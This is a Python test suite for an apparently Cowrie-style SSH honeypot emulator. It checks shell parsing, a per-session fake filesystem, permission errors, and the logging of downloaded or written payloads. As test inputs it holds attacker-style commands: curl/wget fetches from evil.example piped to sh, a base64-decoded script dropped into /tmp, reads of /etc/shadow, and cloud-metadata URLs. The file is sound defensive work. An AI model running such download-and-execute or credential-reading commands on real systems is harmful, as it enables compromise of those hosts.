"""Тесты эмуляции: python3 -m unittest discover -s examples/plugins/cowrie-ssh (нужен paramiko)."""

import http.server
import io
import json
import os
import sys
import tempfile
import threading
import unittest
from contextlib import redirect_stdout
from unittest import mock

os.environ.setdefault("HF_PARAMS", json.dumps({"hostname": "web01"}))
os.environ.setdefault("HF_DATA_DIR", tempfile.mkdtemp())
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import honeypot  # noqa: E402


def run(shell, line):
    """Вывод команды и события, которые она отправила агенту."""
    buf = io.StringIO()
    with redirect_stdout(buf):
        out = shell.run_line(line)
    return out, [json.loads(x) for x in buf.getvalue().splitlines()]


class ParseTest(unittest.TestCase):
    def test_chains_pipes_and_redirects(self):
        chain = honeypot.parse('cd /tmp; wget http://x/a.sh -O a.sh && chmod +x a.sh || echo "fail; here" > log')
        self.assertEqual([link for link, _ in chain], [None, ";", "&&", "||"])
        last = chain[3][1][0]
        self.assertEqual(last["argv"], ["echo", "fail; here"])
        self.assertEqual(last["out"], "log")
        pipe = honeypot.parse("curl -s http://x/i.sh | sh")[0][1]
        self.assertEqual([c["argv"][0] for c in pipe], ["curl", "sh"])

    def test_quotes_and_comments(self):
        self.assertEqual(honeypot.parse("echo 'a  b' \"c\\\"d\" # tail")[0][1][0]["argv"], ["echo", "a  b", 'c"d'])
        self.assertEqual(honeypot.parse("# только комментарий"), [])


class ShellTest(unittest.TestCase):
    def setUp(self):
        self.sh = honeypot.Shell("root", ("203.0.113.9", 4444))

    def test_bot_one_liner(self):
        out, _ = run(self.sh, "uname -a; id; nproc; cat /proc/cpuinfo | grep 'model name' | wc -l")
        self.assertIn("Linux web01 5.15.0-105-generic", out)
        self.assertIn("uid=0(root)", out)
        self.assertTrue(out.rstrip().endswith("4"))
        self.assertNotIn("command not found", out)

    def test_filesystem_is_stateful_per_session(self):
        run(self.sh, "mkdir -p /tmp/.x/y && cd /tmp/.x && echo hi > note && cp note y/ && ls -a y")
        self.assertEqual(self.sh.cwd, "/tmp/.x")
        out, _ = run(self.sh, "cat y/note; ls")
        self.assertEqual(out, "hi\nnote  y\n")
        run(self.sh, "rm -rf /tmp/.x")
        out, _ = run(self.sh, "ls /tmp/.x")
        self.assertIn("No such file or directory", out)
        self.assertEqual(honeypot.Shell("root", ("x", 1)).fs.get("/tmp/.x"), None, "у каждой сессии своя ФС")

    def test_variables_and_input_redirect(self):
        out, _ = run(self.sh, "export D=/etc; cat $D/hostname; echo '$D' \"$D\" ${HOME}; wc -l < $D/hosts")
        self.assertEqual(out, "web01\n$D /etc /root\n3\n")

    def test_ls_long(self):
        out, _ = run(self.sh, "ls -l /etc/hostname")
        self.assertRegex(out, r"^-rw-r--r-- 1 root  root  +6 \w{3} \d\d \d\d:\d\d /etc/hostname\n$")
        out, _ = run(self.sh, "ls -la /tmp")
        self.assertTrue(out.startswith("total "))
        self.assertIn("drwxrwxrwt", out)

    def test_head_tail(self):
        out, _ = run(self.sh, "head -c 4 /etc/hostname; echo; head -n1 /etc/passwd; tail -1 /etc/hosts")
        self.assertEqual(out, "web0\nroot:x:0:0:root:/root:/bin/bash\n::1 ip6-localhost ip6-loopback\n")

    def test_and_or_follow_exit_status(self):
        out, _ = run(self.sh, "cat /nope && echo yes || echo no")
        self.assertTrue(out.endswith("no\n"))
        self.assertNotIn("yes", out)

    def test_unknown_command_looks_like_bash(self):
        out, _ = run(self.sh, "nmap -sS 10.0.0.0/8")
        self.assertEqual(out, "-bash: nmap: command not found\n")
        self.sh.interactive = False
        out, _ = run(self.sh, "nmap")
        self.assertEqual(out, "bash: line 1: nmap: command not found\n")

    def test_permissions_for_regular_user(self):
        user = honeypot.Shell("admin", ("x", 1))
        out, _ = run(user, "cat /etc/shadow; cd /root; pwd")
        self.assertIn("cat: /etc/shadow: Permission denied", out)
        self.assertIn("cd: /root: Permission denied", out)
        self.assertTrue(out.endswith("/home/admin\n"))

    def test_written_file_is_reported_with_hash(self):
        _, events = run(self.sh, "echo IyEvYmluL3NoCmVjaG8gIlJDRSIK | base64 -d > /tmp/rce.sh")
        self.assertEqual(len(events), 1)
        ev = events[0]
        self.assertEqual(ev["type"], "payload")
        self.assertEqual(ev["data"]["path"], "/tmp/rce.sh")
        self.assertEqual(ev["data"]["payload_sample"], '#!/bin/sh\necho "RCE"\n')
        self.assertEqual(len(ev["data"]["payload_sha256"]), 64)

    def test_scripts_run_line_by_line(self):
        run(self.sh, "printf 'cd /tmp\\nmkdir loot\\n' > /tmp/s.sh")
        out, _ = run(self.sh, "./s.sh")
        self.assertEqual(out, "-bash: ./s.sh: No such file or directory\n", "в /root скрипта нет")
        out, _ = run(self.sh, "cd /tmp; ./s.sh")
        self.assertIn("Permission denied", out, "без +x скрипт не запускается")
        _, events = run(self.sh, "cd /tmp; chmod +x s.sh; ./s.sh")
        self.assertIn("/tmp/loot", self.sh.fs)
        self.assertEqual([e["data"]["line"] for e in events if e["type"] == "command"], ["cd /tmp", "mkdir loot"])

    def test_download_disabled_records_url(self):
        out, events = run(self.sh, "cd /tmp && wget http://evil.example/x.sh || curl -O http://evil.example/y.sh")
        self.assertIn("failed: Connection timed out", out)
        self.assertIn("curl: (28) Failed to connect to evil.example port 80", out)
        self.assertEqual([e["data"]["url"] for e in events], ["http://evil.example/x.sh", "http://evil.example/y.sh"])
        self.assertEqual(events[0]["data"]["path"], "/tmp/x.sh")
        self.assertFalse(events[0]["data"]["downloaded"])
        self.assertNotIn("/tmp/x.sh", self.sh.fs, "нескачанный файл не появляется")


class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        body = b"#!/bin/sh\nmkdir /tmp/miner\n" if self.path == "/i.sh" else b"x" * 5000
        if self.path == "/redir":
            self.send_response(302)
            self.send_header("Location", "/i.sh")
            self.end_headers()
            return
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


class DownloadTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.srv = http.server.HTTPServer(("127.0.0.1", 0), Handler)
        cls.base = f"http://127.0.0.1:{cls.srv.server_port}"
        threading.Thread(target=cls.srv.serve_forever, daemon=True).start()

    @classmethod
    def tearDownClass(cls):
        cls.srv.shutdown()

    def test_private_addresses_are_refused(self):
        for url in (self.base + "/i.sh", "http://10.0.0.1/x", "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd"):
            data, err = honeypot.fetch(url)
            self.assertIsNone(data, url)
            self.assertTrue(err, url)

    def test_download_pipe_to_sh_runs_script(self):
        sh = honeypot.Shell("root", ("x", 1))
        with mock.patch.object(honeypot, "public_address", return_value="198.51.100.7"), \
                mock.patch.object(honeypot, "DOWNLOAD", True):
            _, events = run(sh, f"curl -s {self.base}/redir | sh")
        payload = [e for e in events if e["type"] == "payload"][0]["data"]
        self.assertTrue(payload["downloaded"])
        self.assertEqual(payload["payload_size"], len(b"#!/bin/sh\nmkdir /tmp/miner\n"))
        self.assertIn("/tmp/miner", sh.fs, "скачанный скрипт выполнен в эмуляции")
        saved = os.path.join(os.environ["HF_DATA_DIR"], "downloads", payload["payload_sha256"])
        self.assertTrue(os.path.exists(saved))

    def test_size_limit(self):
        with mock.patch.object(honeypot, "public_address", return_value="198.51.100.7"):
            data, err = honeypot.fetch(self.base + "/big", max_bytes=1024)
        self.assertEqual(len(data), 1024)
        self.assertEqual(err, "truncated")


if __name__ == "__main__":
    unittest.main()
